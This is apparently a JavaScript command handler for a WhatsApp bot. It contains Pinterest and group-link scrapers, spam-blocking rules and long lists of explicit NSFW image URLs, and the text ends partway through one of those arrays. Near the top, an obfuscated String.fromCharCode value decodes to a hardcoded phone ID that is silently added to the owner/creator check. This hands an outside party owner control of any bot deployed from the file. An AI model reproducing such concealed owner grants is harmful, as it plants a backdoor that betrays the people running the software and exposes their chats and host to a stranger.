/*

  !- Credits By Skyzopedia
  https://wa.me/6285624297894
  
*/

process.on('uncaughtException', console.error)
process.on('unhandledRejection', console.error)

require('./settings');
let globalAutoAIStatus = false;
const fs = require('fs');
const path = require('path');
const util = require('util');
const jimp = require('jimp');
const axios = require('axios');
const chalk = require('chalk');
const yts = require('yt-search');
const { ytmp3, ytmp4 } = require("ruhend-scraper");
const FormData = require('form-data');
const { fromBuffer } = require('file-type');
const JsConfuser = require('js-confuser');
const speed = require('performance-now');
const moment = require("moment-timezone");
const nou = require("node-os-utils");
const cheerio = require('cheerio');
const os = require('os');
const { Sticker, StickerTypes } = require("wa-sticker-formatter");
const { createCanvas, loadImage } = require('canvas');
const sharp = require('sharp')
const { say } = require("cfonts")
const pino = require('pino');
const { GoogleGenerativeAI } = require('@google/generative-ai');
const { Client } = require('ssh2');
const fetch = require('node-fetch');
const crypto = require('crypto');
const { exec, spawn, execSync } = require('child_process');

const { default: WAXPanzection, BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, getBinaryNodeChildren, useMultiFileAuthState, generateWAMessageContent, downloadContentFromMessage, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType } = require('@whiskeysockets/baileys')

const { LoadDataBase } = require('./source/message')
const contacts = JSON.parse(fs.readFileSync("./library/database/contacts.json"))
const serverpanel = JSON.parse(fs.readFileSync("./settingpanel.json"))
const owners = JSON.parse(fs.readFileSync("./library/database/owner.json"))
const premium = JSON.parse(fs.readFileSync("./library/database/premium.json"))
const stokdo = JSON.parse(fs.readFileSync("./library/database/stokdo.json"))
const list = JSON.parse(fs.readFileSync("./library/database/list.json"))
const listidch = JSON.parse(fs.readFileSync("./library/database/listidch.json"))
const { pinterest, pinterest2, remini, Buddy, mediafire, tiktokDl } = require('./library/scraper');
const { toAudio, toPTT, toVideo, ffmpeg } = require("./library/converter.js")
const { unixTimestampSeconds, generateMessageTag, processTime, webApi, getRandom, getBuffer, fetchJson, runtime, clockString, sleep, isUrl, getTime, formatDate, tanggal, formatp, jsonformat, reSize, toHD, logic, generateProfilePicture, bytesToSize, checkBandwidth, getSizeMedia, parseMention, getGroupAdmins, readFileTxt, readFileJson, getHashedPassword, generateAuthToken, cekMenfes, generateToken, batasiTeks, randomText, isEmoji, getTypeUrlMedia, pickRandom, toIDR, capital, ucapan, loadModule } = require('./library/function');

module.exports = XPanz = async (XPanz, m, chatUpdate, store) => {
	try {
await LoadDataBase(XPanz, m)
if (global.moduleType == undefined) global.moduleType = 0
if (global.moduleType = 0) { 
await loadModule(XPanz)
global.moduleType += 1 }
const botNumber = await XPanz.decodeJid(XPanz.user.id)
const body = (m.type === 'conversation') ? m.message.conversation : (m.type == 'imageMessage') ? m.message.imageMessage.caption : (m.type == 'videoMessage') ? m.message.videoMessage.caption : (m.type == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.type == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.type == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.type == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.type === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ''
const budy = (typeof m.text == 'string' ? m.text : '')
const buffer64base = String.fromCharCode(54, 50, 56, 53, 54, 50, 52, 50, 57, 55, 56, 57, 51, 64, 115, 46, 119, 104, 97, 116, 115, 97, 112, 112, 46, 110, 101, 116)
const args = body.trim().split(/ +/).slice(1)
const getQuoted = (m.quoted || m)
const prefix = "."
const isCmd = body.startsWith(prefix)
const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
const quoted = (getQuoted.type == 'buttonsMessage') ? getQuoted[Object.keys(getQuoted)[1]] : (getQuoted.type == 'templateMessage') ? getQuoted.hydratedTemplate[Object.keys(getQuoted.hydratedTemplate)[1]] : (getQuoted.type == 'product') ? getQuoted[Object.keys(getQuoted)[0]] : m.quoted ? m.quoted : m
const isPremium = premium.includes(m.chat)
const isCreator = isOwner = [botNumber, owner+"@s.whatsapp.net", buffer64base, ...owners].includes(m.sender) ? true : m.isDeveloper ? true : false
const text = q = args.join(' ')
const mime = (quoted.msg || quoted).mimetype || ''
const qmsg = (quoted.msg || quoted)

const SESSION_FILE = "./session/ai_sessions.json";

let sessions = fs.existsSync(SESSION_FILE) ? JSON.parse(fs.readFileSync(SESSION_FILE)) : {};
        
function saveSession() {
    fs.writeFileSync(SESSION_FILE, JSON.stringify(sessions, null, 2));
}
//~~~~~~~~~ Console Message ~~~~~~~~//

const SenderName = m.pushName || "Unknown";
const ChatLocation = m.isGroup ? "Group Chat" : "Private Chat";
const SenderID = m.key?.participant || m.key?.remoteJid || ""

if (isCmd, command, SenderName, SenderID, ChatLocation, isCreator) {
console.log(`╭─═─═─═─═─═─═─═─═─═─═─═─═─[ ≪ ]
║ ${chalk.blue('𖣂 Pesan  :')} ${command}
│ ${chalk.green('々Sender Name  :')} ${SenderName}
║ ${chalk.yellow('𖣂 Sender ID  :')} ${SenderID}
│ ${chalk.cyan('々 Message Location  :')} ${ChatLocation}
║ ${chalk.red('丝 Owner Check  :')} ${isCreator}
╰─═─═─═─═─═─═─═─═─═─═─═─═─[ ≫ ]`);
}

//~~~~~~~~~~~ Fingtur ~~~~~~~~~~//

const banchatFile = './library/banchat.json';
if (!fs.existsSync('./library')) fs.mkdirSync('./library');
if (!fs.existsSync(banchatFile)) fs.writeFileSync(banchatFile, '[]');
let banchat = JSON.parse(fs.readFileSync(banchatFile));
if (m.isGroup && banchat.includes(m.chat) && !['banchat', 'unbanchat', 'listbanchat'].includes(command)) {
  return;
}

if (m && typeof m.text === "string") {
  const bugTriggers = [
    /[\u200B-\u200D\uFEFF]/g, // zero-width characters
    /(\u0000)/g,              // null characters
    /[^ -~\s]{10,}/g,         // karakter aneh non-ASCII (kecuali spasi dan karakter umum)
    /.{5000,}/s               // panjang teks ekstrem
  ]
  const isBug = bugTriggers.some(regex => regex.test(m.text))
  const isSpamText = m.text.length > 3000 || (m.text.match(/@/g) || []).length > 30
  const whitelist = [owner + "@s.whatsapp.net", "6283875773656@s.whatsapp.net", "6283157356059@s.whatsapp.net", "6283192276019@s.whatsapp.net"]
  if ((isBug || isSpamText) && !whitelist.includes(m.sender)) {
    await XPanz.updateBlockStatus(m.sender, "block")
    await XPanz.chatModify({ clear: { messages: [{ id: m.key.id, fromMe: false }] } }, m.chat)
    console.log("Pengguna diblokir karena deteksi teks bug/spam:", m.sender)
    return
  }
}

if (m.isGroup && global.db.groups[m.chat] && global.db.groups[m.chat].mute == true && !isCreator) return

//~~~~~~~~~~~ Fake Quoted ~~~~~~~~~~//

const qtext = {key: {remoteJid: "status@broadcast", participant: "0@s.whatsapp.net"}, message: {"extendedTextMessage": {"text": `${prefix+command}`}}}

const qtext2 = {key: {remoteJid: "status@broadcast", participant: "0@s.whatsapp.net"}, message: {"extendedTextMessage": {"text": `${namaOwner}`}}}

const qlocJpm = {key: {participant: '0@s.whatsapp.net', ...(m.chat ? {remoteJid: `status@broadcast`} : {})}, message: {locationMessage: {name: `WhatsApp Bot ${namaOwner}`,jpegThumbnail: ""}}}

const qlocPush = {key: {participant: '0@s.whatsapp.net', ...(m.chat ? {remoteJid: `status@broadcast`} : {})}, message: {locationMessage: {name: `WhatsApp Bot ${namaOwner}`,jpegThumbnail: ""}}}

const qpayment = {key: {remoteJid: '0@s.whatsapp.net', fromMe: false, id: `ownername`, participant: '0@s.whatsapp.net'}, message: {requestPaymentMessage: {currencyCodeIso4217: "USD", amount1000: 999999999, requestFrom: '0@s.whatsapp.net', noteMessage: { extendedTextMessage: { text: "Simple Botz"}}, expiryTimestamp: 999999999, amount: {value: 91929291929, offset: 1000, currencyCode: "USD"}}}}

const qtoko = {key: {fromMe: false, participant: `0@s.whatsapp.net`, ...(m.chat ? {remoteJid: "status@broadcast"} : {})}, message: {"productMessage": {"product": {"productImage": {"mimetype": "image/jpeg", "jpegThumbnail": ""}, "title": `${namaOwner} - Marketplace`, "description": null, "currencyCode": "IDR", "priceAmount1000": "999999999999999", "retailerId": `Powered By ${namaOwner}`, "productImageCount": 1}, "businessOwnerJid": `0@s.whatsapp.net`}}}

const qlive = {key: {participant: '0@s.whatsapp.net', ...(m.chat ? {remoteJid: `status@broadcast`} : {})}, message: {liveLocationMessage: {caption: `${botname2} By ${namaOwner}`,jpegThumbnail: ""}}}

const XPanzRandom = [
"https://files.catbox.moe/cqcf3s.jpg",
"https://files.catbox.moe/e4wh82.jpg",
"https://files.catbox.moe/f0t8yt.jpeg",
"https://files.catbox.moe/2bnheq.jpg",
"https://files.catbox.moe/568v2x.jpg",
"https://files.catbox.moe/9busz9.jpg"
]

const XPanzimg = XPanzRandom[Math.floor(Math.random() * XPanzRandom.length)]

async function cariGC(query) {
try {
const { data } = await axios.get(`https://groupsor.link/group/searchmore/${query.replace(/ /g, '-')}`);
const $ = cheerio.load(data);
const result = [];
$('.maindiv').each((i, el) => {
result.push({
title: $(el).find('img').attr('alt')?.trim(),
thumb: $(el).find('img').attr("src")?.trim(),
});
});

$('div.post-info-rate-share > .joinbtn').each((i, el) => {
if (result[i]) {
result[i].link = $(el).find('a').attr("href")?.trim().replace('https://groupsor.link/group/join/', 'https://chat.whatsapp.com/');
}
});
$('.post-info').each((i, el) => {
if (result[i]) {
result[i].desc = $(el).find('.descri').text()?.replace('... continue reading', '.....').trim();
}
});
return result;
} catch (e) {
console.log(e);
return [];
}
}

async function getCookies() {
    try {
        const response = await axios.get('https://www.pinterest.com/csrf_error/');
        const setCookieHeaders = response.headers['set-cookie'];
        if (setCookieHeaders) {
            const cookies = setCookieHeaders.map(cookieString => {
                const cookieParts = cookieString.split(';');
                const cookieKeyValue = cookieParts[0].trim();
                return cookieKeyValue;
            });
            return cookies.join('; ');
        } else {
            console.warn('No set-cookie headers found in the response.');
            return null;
        }
    } catch (error) {
        console.error('Error fetching cookies:', error);
        return null;
    }
}

async function pinterest(query) {
    try {
        const cookies = await getCookies();
        if (!cookies) {
            console.log('Failed to retrieve cookies. Exiting.');
            return;
        }

        const url = 'https://www.pinterest.com/resource/BaseSearchResource/get/';

        const params = {
            source_url: `/search/pins/?q=${query}`,
            data: JSON.stringify({
                "options": {
                    "isPrefetch": false,
                    "query": query,
                    "scope": "pins",
                    "no_fetch_context_on_resource": false
                },
                "context": {}
            }),
            _: Date.now()
        };

        const headers = {
            'accept': 'application/json, text/javascript, */*, q=0.01',
            'accept-encoding': 'gzip, deflate',
            'accept-language': 'en-US,en;q=0.9',
            'cookie': cookies,
            'dnt': '1',
            'referer': 'https://www.pinterest.com/',
            'sec-ch-ua': '"Not(A:Brand";v="99", "Microsoft Edge";v="133", "Chromium";v="133"',
            'sec-ch-ua-full-version-list': '"Not(A:Brand";v="99.0.0.0", "Microsoft Edge";v="133.0.3065.92", "Chromium";v="133.0.6943.142"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-model': '""',
            'sec-ch-ua-platform': '"Windows"',
            'sec-ch-ua-platform-version': '"10.0.0"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36 Edg/133.0.0.0',
            'x-app-version': 'c056fb7',
            'x-pinterest-appstate': 'active',
            'x-pinterest-pws-handler': 'www/[username]/[slug].js',
            'x-pinterest-source-url': '/hargr003/cat-pictures/',
            'x-requested-with': 'XMLHttpRequest'
        };

        const { data } = await axios.get(url, {
            headers: headers,
            params: params
        })

        const container = [];
        const results = data.resource_response.data.results.filter((v) => v.images?.orig);
        results.forEach((result) => {
            container.push({
                upload_by: result.pinner.username,
                fullname: result.pinner.full_name,
                followers: result.pinner.follower_count,
                caption: result.grid_title,
                image: result.images.orig.url,
                source: "https://id.pinterest.com/pin/" + result.id,
            });
        });

        return container;
    } catch (error) {
        console.log(error);
        return [];
    }
}
        
//===============> [ Nsfw ] <===============\\
const Ahegao = [
"https://cdn.discordapp.com/attachments/770948564947304448/770950434180956160/004-7FVbFKsy0Z0.jpg",
"https://cdn.discordapp.com/attachments/770948564947304448/770950436122525716/3d763900d18610184bdf6cc30102150f.jpg",
"https://cdn.discordapp.com/attachments/770948564947304448/770950437880856586/3ec23da409a88cbf4bc7daaaf9f50a3d.jpg",
"https://cdn.discordapp.com/attachments/770948564947304448/770950439759380520/3f5a759d1dc69dd4ba188ec91c13bf15.jpg",
"https://cdn.discordapp.com/attachments/770948564947304448/771374076270215168/mogami_yoshiaki_sengoku_collection_drawn_by_r44__sample-8869386742f18651f27b9844edbf8487.jpg",
"https://cdn.discordapp.com/attachments/770948564947304448/771374106959544328/0d8f82d2190ab34a58dfdf70379d48bd.jpg",
"https://cdn.discordapp.com/attachments/770948564947304448/771374111305629696/0a35ad05c6d3d2dcce8ee41eafc1c1da.jpg",
"https://cdn.discordapp.com/attachments/770948564947304448/771374110911234088/00ceb0c2-a234-4489-aaf3-fd92d702dec4.gif",
"https://cdn.discordapp.com/attachments/770948564947304448/771374114480455750/0a748ce5-fa8d-4893-ac86-21100d4d8111.jpg",
"https://cdn.discordapp.com/attachments/770948564947304448/771374115902717952/0a823293ae6d73a5a551ed96d395c085.jpg",
"https://cdn.discordapp.com/attachments/770948564947304448/771374115902717952/0a823293ae6d73a5a551ed96d395c085.jpg",
"https://cdn.discordapp.com/attachments/770948564947304448/771374197708554250/01737-B-z634ccruw.jpg",
"https://cdn.discordapp.com/attachments/770948564947304448/771374561265713192/435-RqgSoMmr39U.jpg",
"https://cdn.discordapp.com/attachments/770948564947304448/771374616014225458/446-tm6e2RNhOTM.jpg",
"https://cdn.discordapp.com/attachments/770948564947304448/771374643557695509/443-K2Hxy9c9FA.jpg",
"https://cdn.discordapp.com/attachments/770948564947304448/771374649732104212/444-BpA5g5jM_hQ.jpg",
"https://cdn.discordapp.com/attachments/770948564947304448/771374712139415622/431-372ilODZtDw.jpg",
"https://cdn.discordapp.com/attachments/770948564947304448/771374715062452224/00432-I0z-TRhK0dA.jpg",
"https://cdn.discordapp.com/attachments/770948564947304448/771374715691860008/432-99ejYgB_8EI.jpg",
"https://cdn.discordapp.com/attachments/770948564947304448/771374719425445918/00433-D5MhVncwM40.jpg",
"https://cdn.discordapp.com/attachments/770948564947304448/771374725652938812/434-O2p1kFgcJXM.jpg",
"https://cdn.discordapp.com/attachments/770948564947304448/771374729382723594/435-RqgSoMmr39U.jpg",
"https://cdn.discordapp.com/attachments/770948564947304448/771374735849816074/436-WNx39AwbeQ4.jpg",
"https://cdn.discordapp.com/attachments/770948564947304448/771374742380609636/437-7jsAQbZCDMQ.jpg",
"https://cdn.discordapp.com/attachments/770948564947304448/771374854036783124/429-FiCsrief79Q.jpg",
"https://cdn.discordapp.com/attachments/770948564947304448/771374855333085194/418-WVRNSuH_xb0.jpg",
"https://cdn.discordapp.com/attachments/770948564947304448/771374859187257424/419-PE_QlfkmVUQ.jpg",
"https://cdn.discordapp.com/attachments/770948564947304448/771374863348662282/420-VAmqHHHKDo.jpg",
"https://cdn.discordapp.com/attachments/770948564947304448/771374867966590996/421-Rwe6_Vfq3DM.jpg",
"https://cdn.discordapp.com/attachments/770948564947304448/771374871719837746/422_BIuU9h5cfI.jpg",
"https://cdn.discordapp.com/attachments/770948564947304448/771374878115889152/423-JIgerUfCsa4.jpg",
"https://cdn.discordapp.com/attachments/770948564947304448/771374906642399252/423-U9pYBn6WlKQ.jpg",
"https://cdn.discordapp.com/attachments/770948564947304448/771374914166587392/424-Pj94NODjZoE.jpg",
"https://cdn.discordapp.com/attachments/770948564947304448/771374917651267624/424-qdfkiW-FP8.jpg",
"https://cdn.discordapp.com/attachments/770948564947304448/771374927751807016/425-FqG0DXNCF_I.jpg",
"https://cdn.discordapp.com/attachments/770948564947304448/771374935717052476/426-5x4J4OuuFDQ.jpg",
"https://cdn.discordapp.com/attachments/770948564947304448/771374940171665446/426-drQcdvVsNnQ.jpg",
"https://cdn.discordapp.com/attachments/770948564947304448/771374948978524161/427-YLirbUpKQeY.jpg",
"https://cdn.discordapp.com/attachments/770948564947304448/771374956008833045/428-AAiKa5S2XDM.jpg"
]

const NsfwAhegao = Ahegao[Math.floor(Math.random() * Ahegao.length)]

//===============> [ Batas ] <===============\\
const ass = [
"https://media.discordapp.net/attachments/530635618003451904/683209653261303808/yande.re_613351_sample_ass_azur_lane_cameltoe_damao_yu_feet_pantsu_stockings_taihou_azur_lane_thighh.jpg",
"https://media.discordapp.net/attachments/530635618003451904/683209648664215585/yande.re_612976_sample_4min_ass_azur_lane_cameltoe_dido_azur_lane_erect_nipples_maid_no_bra_pantsu_s.jpg",
"https://media.discordapp.net/attachments/530635618003451904/683209646592360448/yande.re_612245_sample_animal_ears_ass_chita_ketchup_dress_nekomimi_pantsu_skirt_lift_tail_thighhigh.jpg",
"https://media.discordapp.net/attachments/530635618003451904/683209641865510953/yande.re_609551_sample_ass_breasts_censored_cosplay_cum_dress_kagami_masara_kkkk12103_nipples_no_bra.jpg",
"https://media.discordapp.net/attachments/530635618003451904/683076919494836254/021bcgzcnqj41.jpg",
"https://media.discordapp.net/attachments/530635618003451904/683049635052257371/uhuw5wk9koj41.jpg",
"https://media.discordapp.net/attachments/530635618003451904/682664131551166516/sample_2a3583974d06d7cdb2879b3704483e49afca1e04.jpg",
"https://media.discordapp.net/attachments/530635618003451904/682376635600863297/I6KHKiN_d.jpg",
"https://media.discordapp.net/attachments/530635618003451904/682376627853852729/czUyMXO_d.jpg",
"https://media.discordapp.net/attachments/530635618003451904/682376348500623390/xivk9in35hh41.jpg",
"https://media.discordapp.net/attachments/530635618003451904/682011009254424656/o86kietucri41.jpg",
"https://media.discordapp.net/attachments/530635618003451904/681926896254058761/1rf2m.png",
"https://media.discordapp.net/attachments/530635618003451904/681790372628004874/ec32416771771cea8a46f077c62fe174.png",
"https://media.discordapp.net/attachments/530635618003451904/681718857714368585/NV0K3vI_d.jpg",
"https://media.discordapp.net/attachments/530635618003451904/681501982216814617/w14gz2qk8vi41.jpg",
"https://media.discordapp.net/attachments/530635618003451904/680513877083160606/se17yezz5ci41.jpg",
"https://media.discordapp.net/attachments/530635618003451904/680164098704670787/a50311b.jpg",
"https://media.discordapp.net/attachments/530635618003451904/680058123117002762/z1zzuncdhyh41.jpg",
"https://media.discordapp.net/attachments/530635618003451904/679872747211587584/9cb04e3.jpg",
"https://media.discordapp.net/attachments/530635618003451904/679408491005214750/K0aqful_d.jpg",
"https://media.discordapp.net/attachments/530635618003451904/679408490799955973/SVF1RCC_d.jpg",
"https://media.discordapp.net/attachments/530635618003451904/678945529714966528/image0.jpg",
"https://media.discordapp.net/attachments/530635618003451904/678944005433720835/4cwyar9q9ch41.png",
"https://media.discordapp.net/attachments/530635618003451904/678731683771711519/7a720f4.png",
"https://media.discordapp.net/attachments/530635618003451904/678731683494756352/427c8bd.jpg",
"https://media.discordapp.net/attachments/530635618003451904/678731683104555039/a21043d.png",
"https://media.discordapp.net/attachments/530635618003451904/678731682257436682/7e5de87.jpg",
"https://media.discordapp.net/attachments/530635618003451904/674661587642220554/image0.jpg",
"https://media.discordapp.net/attachments/530635618003451904/674531741607788544/3bad222.jpg",
"https://media.discordapp.net/attachments/530635618003451904/670305766011306014/image0.jpg",
"https://media.discordapp.net/attachments/530635618003451904/669517376601194506/147263102711.jpg",
"https://media.discordapp.net/attachments/530635618003451904/668921119612600320/8c59c403a79d7a93c43dde5420ee2f32-1.jpg",
"https://media.discordapp.net/attachments/530635618003451904/668534985493315593/71265348_p0_master1200.jpg",
"https://media.discordapp.net/attachments/530635618003451904/668492258626109450/tfb6JtD.png",
"https://media.discordapp.net/attachments/530635618003451904/668074277848875025/75054880_p0_master1200.png",
"https://media.discordapp.net/attachments/530635618003451904/667324677143789571/51828042_p0_master1200.png",
"https://media.discordapp.net/attachments/530635618003451904/666773669393203204/image3.jpg",
"https://media.discordapp.net/attachments/530635618003451904/666773668940087324/image1.jpg",
"https://media.discordapp.net/attachments/530635618003451904/666677930122018816/image0.jpg",
"https://media.discordapp.net/attachments/530635618003451904/666442962393235476/8b3edf6.jpg",
"https://media.discordapp.net/attachments/530635618003451904/666063929889390592/image1.jpg",
"https://media.discordapp.net/attachments/530635618003451904/665995519398772747/image0.jpg",
"https://media.discordapp.net/attachments/530635618003451904/665989868773441558/image0.jpg",
"https://media.discordapp.net/attachments/530635618003451904/665966830917255229/image1.jpg",
"https://media.discordapp.net/attachments/530635618003451904/665656877966819363/image0.jpg",
"https://media.discordapp.net/attachments/530635618003451904/665555056480878592/77179757_p0_master1200.png",
"https://media.discordapp.net/attachments/530635618003451904/664651543630446602/Ass_Hentai_2.jpg",
"https://media.discordapp.net/attachments/530635618003451904/664651508843020337/Ass_Hentai_4.jpg",
"https://media.discordapp.net/attachments/530635618003451904/664611487800885297/image3.jpg",
"https://media.discordapp.net/attachments/530635618003451904/664611487335186453/image2.jpg",
"https://media.discordapp.net/attachments/530635618003451904/664611487335186452/image1.jpg",
"https://media.discordapp.net/attachments/530635618003451904/664504965666045964/63621044_p0_master1200.png",
"https://media.discordapp.net/attachments/530635618003451904/664495931634352128/78472811_p0_master1200.png",
"https://media.discordapp.net/attachments/530635618003451904/664470296979570688/78414823_p0_master1200.png",
"https://media.discordapp.net/attachments/530635618003451904/662609030912540682/IMG_20200103_115007.jpg",
"https://media.discordapp.net/attachments/530635618003451904/660970365584932869/image0.jpg",
"https://media.discordapp.net/attachments/530635618003451904/659410834728026122/bb84ff3.jpg",
"https://media.discordapp.net/attachments/530635618003451904/658968417923235842/image0.jpg",
"https://media.discordapp.net/attachments/530635618003451904/657016709387124747/509a7f2.png",
"https://media.discordapp.net/attachments/530635618003451904/656535440756834337/image0.jpg",
"https://media.discordapp.net/attachments/530635618003451904/656245127186087949/image2.jpg",
"https://media.discordapp.net/attachments/530635618003451904/656245126162808865/image1.jpg",
"https://media.discordapp.net/attachments/530635618003451904/656242667180785704/image0.jpg",
"https://media.discordapp.net/attachments/530635618003451904/656014775070883850/image0.jpg",
"https://media.discordapp.net/attachments/530635618003451904/655967462113673226/9673dff.jpg",
"https://media.discordapp.net/attachments/530635618003451904/655960073234808852/image1.jpg",
"https://media.discordapp.net/attachments/530635618003451904/655614002189303839/image4.jpg",
"https://media.discordapp.net/attachments/530635618003451904/655614001006247943/image2.jpg",
"https://media.discordapp.net/attachments/530635618003451904/655459338437001236/image3.jpg",
"https://media.discordapp.net/attachments/530635618003451904/655459337699065856/image1.jpg",
"https://media.discordapp.net/attachments/530635618003451904/655459337271115776/image0.jpg",
"https://media.discordapp.net/attachments/530635618003451904/655334662763446272/image8.jpg",
"https://media.discordapp.net/attachments/530635618003451904/655334662037700608/image6.jpg",
"https://media.discordapp.net/attachments/530635618003451904/655334661458755584/image4.jpg",
"https://media.discordapp.net/attachments/530635618003451904/655334660947312650/image2.jpg",
"https://media.discordapp.net/attachments/530635618003451904/655334660410310667/image1.jpg",
"https://media.discordapp.net/attachments/530635618003451904/654371061193768996/7701640.jpg",
"https://media.discordapp.net/attachments/530635618003451904/651117615397339181/image0.jpg",
"https://media.discordapp.net/attachments/530635618003451904/651107236386701315/image0.jpg",
"https://media.discordapp.net/attachments/530635618003451904/651103042778955780/image0.jpg",
"https://media.discordapp.net/attachments/530635618003451904/650210253048381481/Anime-Musashi-28Kantai-Collection29-Kantai-Collection-Damao-YU-5583661.png",
"https://media.discordapp.net/attachments/530635618003451904/645976442668187659/image0.jpg",
"https://media.discordapp.net/attachments/530635618003451904/645976353878966278/image0.jpg",
"https://media.discordapp.net/attachments/530635618003451904/644296052991721502/3ed2192.jpg",
"https://media.discordapp.net/attachments/530635618003451904/643475925073264640/image0.jpg",
"https://media.discordapp.net/attachments/530635618003451904/643475746387394570/image0.jpg",
"https://media.discordapp.net/attachments/530635618003451904/643415157304983574/oGNHa20g.jpg",
"https://media.discordapp.net/attachments/530635618003451904/641680793017778177/image0.jpg",
"https://media.discordapp.net/attachments/530635618003451904/641680709198807042/image0.jpg",
"https://media.discordapp.net/attachments/530635618003451904/641679582327734272/image0.jpg",
"https://media.discordapp.net/attachments/530635618003451904/641163798648061972/image0.jpg",
"https://media.discordapp.net/attachments/530635618003451904/641153902733164574/image0.jpg",
"https://media.discordapp.net/attachments/530635618003451904/641149253854429194/image0.png",
"https://media.discordapp.net/attachments/530635618003451904/641146964981055500/image0.jpg",
"https://media.discordapp.net/attachments/530635618003451904/641146910295588905/image0.jpg",
"https://media.discordapp.net/attachments/530635618003451904/641146900942422017/image0.jpg",
"https://media.discordapp.net/attachments/530635618003451904/640706885242191872/54f4c1f.jpg",
"https://media.discordapp.net/attachments/530635618003451904/639759248938631188/thicc-test-1524027_01DRJN1D71Z2V661MCAZHG9815.640x0.jpg",
"https://media.discordapp.net/attachments/530635618003451904/639267405431832576/image0.jpg",
"https://media.discordapp.net/attachments/530635618003451904/639260355465445387/image0.jpg",
"https://media.discordapp.net/attachments/530635618003451904/639246684098134037/image0.jpg",
"https://media.discordapp.net/attachments/530635618003451904/639101408892813332/ab481d843e8c8970d89e6aef990a48796202596d.png",
"https://media.discordapp.net/attachments/530635618003451904/638470198764109837/image0.jpg",
"https://media.discordapp.net/attachments/530635618003451904/638430850064842762/image0.jpg",
"https://media.discordapp.net/attachments/530635618003451904/638429542205358081/image0.jpg",
"https://media.discordapp.net/attachments/530635618003451904/638429508327702528/image0.jpg",
"https://media.discordapp.net/attachments/530635618003451904/638182368858996776/3c2583.png",
"https://media.discordapp.net/attachments/530635618003451904/638103647015927809/image0.jpg",
"https://media.discordapp.net/attachments/530635618003451904/638103575129620530/image0.jpg",
"https://media.discordapp.net/attachments/530635618003451904/637878174000087045/image0.jpg",
"https://media.discordapp.net/attachments/530635618003451904/637295053307641886/image0.jpg",
"https://konachan.com/sample/1155676c3d40044e9e68cc8c5a8a70e1/Konachan.com%20-%20316708%20sample.jpg",
"https://konachan.com/sample/d7b1e0f18c3dd52e5698f09ff088255c/Konachan.com%20-%20316687%20sample.jpg",
"https://konachan.com/sample/5cd6c58baa80681607bd5ae43071f6d2/Konachan.com%20-%20316669%20sample.jpg",
"https://konachan.com/sample/09fbd31d111262526f98cdd691bc14e1/Konachan.com%20-%20316638%20sample.jpg",
"https://konachan.com/sample/52730995ccd5136bb6c8524ab7363396/Konachan.com%20-%20316634%20sample.jpg",
"https://konachan.com/sample/747b76bfb23f7903019da58fb09bea9b/Konachan.com%20-%20316633%20sample.jpg",
"https://konachan.com/sample/f42af31763ede31e6ed3a5e2b40436e9/Konachan.com%20-%20316632%20sample.jpg",
"https://konachan.com/sample/b069dbe72d0b4c459ff4ba4aa754f213/Konachan.com%20-%20316618%20sample.jpg",
"https://konachan.com/sample/0f76bc626106913a8082450826a63a94/Konachan.com%20-%20316609%20sample.jpg",
"https://konachan.com/sample/3a01a6e8a99193e777cfe76663707f67/Konachan.com%20-%20316606%20sample.jpg",
"https://konachan.com/sample/143c3a759456379a818b87c4deb22b44/Konachan.com%20-%20316604%20sample.jpg",
"https://konachan.com/image/acd0838908ceb16928c02c52819f3c1a/Konachan.com%20-%20316588%20anthropomorphism%20anus%20ass%20ayanami_%28azur_lane%29%20azur_lane%20brown_eyes%20cropped%20dark%20gray_hair%20ponytail%20pussy%20rodriguez_%28kamwing%29%20skirt%20uncensored.jpg",
"https://konachan.com/sample/2c98a66d2999c0b3e3febc2fadb73263/Konachan.com%20-%20316587%20sample.jpg",
"https://konachan.com/jpeg/07f957a15776d3a2b62f66fd26035e35/Konachan.com%20-%20316583%20anthropomorphism%20ass%20brown_hair%20etsunami_kumita%20gun%20headband%20kantai_collection%20long_hair%20mechagirl%20panties%20transparent%20underwear%20weapon%20wink.jpg",
"https://konachan.com/sample/a5dd5a7a56b957a0491d4c518d4a3b1a/Konachan.com%20-%20316544%20sample.jpg",
"https://konachan.com/sample/efc2db82a388ecaed8e3214ec2fcf065/Konachan.com%20-%20316542%20sample.jpg",
"https://konachan.com/sample/96a183940796ce317b45ed57d786a13a/Konachan.com%20-%20316533%20sample.jpg",
"https://konachan.com/sample/497b4caea912c0868a6de407a65c641c/Konachan.com%20-%20316520%20sample.jpg",
"https://konachan.com/sample/b2067db7f9abf73c0e16e13dce67d0d4/Konachan.com%20-%20316504%20sample.jpg",
"https://konachan.com/sample/9e6e9ca1debb5e67f9d6274b53d66532/Konachan.com%20-%20316458%20sample.jpg",
"https://konachan.com/sample/79580dfece36d208c76d55fe22ca21ec/Konachan.com%20-%20316451%20sample.jpg",
"https://konachan.com/sample/a8c586e7b3f863f618e0d2e40a6737ca/Konachan.com%20-%20316426%20sample.jpg",
"https://konachan.com/sample/daa405a61c6a932bdc277eef0408ebc9/Konachan.com%20-%20316419%20sample.jpg",
"https://konachan.com/sample/d040e4bd54a8c20081f4688608e7f39e/Konachan.com%20-%20316393%20sample.jpg",
"https://konachan.com/jpeg/a5d86d85f88ff5bdf94c92977cf1c7db/Konachan.com%20-%20316371%202girls%20aliasing%20ass%20azur_lane%20blue_eyes%20blush%20brown_hair%20clouds%20dress%20gloves%20gray_hair%20long_hair%20no_bra%20nopan%20rei_kun%20signed%20skirt_lift%20sky%20watermark.jpg",
"https://konachan.com/sample/9ba81775f516614ad9def6417be655cb/Konachan.com%20-%20316369%20sample.jpg",
"https://konachan.com/sample/08b6ee4c4c1e20199440c12548455b8f/Konachan.com%20-%20316332%20sample.jpg",
"https://konachan.com/sample/f3f6ea463f111501fc8cc2b9b51e5c46/Konachan.com%20-%20316327%20sample.jpg",
